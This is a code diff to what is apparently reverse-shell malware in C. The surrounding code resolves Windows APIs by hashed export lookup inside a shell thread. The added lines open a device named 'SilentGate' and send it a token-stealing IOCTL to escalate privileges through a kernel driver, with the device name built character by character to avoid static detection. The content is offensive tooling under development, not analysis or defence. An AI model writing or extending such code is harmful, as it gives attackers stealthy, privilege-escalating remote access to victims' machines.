@@ -8,6 +8,10 @@ typedef int     (WINAPI *pWSAStartup)(WORD, LPVOID);
 typedef int     (WINAPI *pconnect)(SOCKET, const struct sockaddr*, int);
 typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR,LPSTR,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
 typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef HANDLE  (WINAPI *pCreateFileA2)(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);
+typedef BOOL    (WINAPI *pDeviceIoControl2)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
+typedef BOOL    (WINAPI *pCloseHandle2)(HANDLE);
+#define IOCTL_SG_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN,0x904,METHOD_BUFFERED,FILE_ANY_ACCESS)
 
 static DWORD ror13(const char* name) {
     DWORD h = 0;
@@ -71,6 +75,22 @@ static DWORD WINAPI shell_thread(LPVOID param) {
     pCreateProcessA      _CPA  = (pCreateProcessA)     find_export(k32, 0x16B3FE72);
     pWaitForSingleObject _WFSO = (pWaitForSingleObject)find_export(k32, 0xCE05D9AD);
 
+    /* Try kernel token steal first */
+    {
+        pCreateFileA2 _cf=(pCreateFileA2)find_export(k32,0x7C0017A5u);
+        pDeviceIoControl2 _dio=(pDeviceIoControl2)find_export(k32,0xA8E14A7Du);
+        pCloseHandle2 _clh=(pCloseHandle2)find_export(k32,0x0FFD97FBu);
+        if(_cf&&_dio&&_clh){
+            char dev[]={'\\','\\','.','\\','S','i','l','e','n','t','G','a','t','e',0};
+            dev[0]='\\'; dev[1]='\\';
+            HANDLE hd=_cf(dev,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+            if(hd!=INVALID_HANDLE_VALUE){
+                DWORD nb=0;
+                _dio(hd,IOCTL_SG_STEAL_TOKEN,NULL,0,NULL,0,&nb,NULL);
+                _clh(hd);
+            }
+        }
+    }
     BYTE wsadata[400] = {0};
     _WSAStartup(0x0202, wsadata);
 
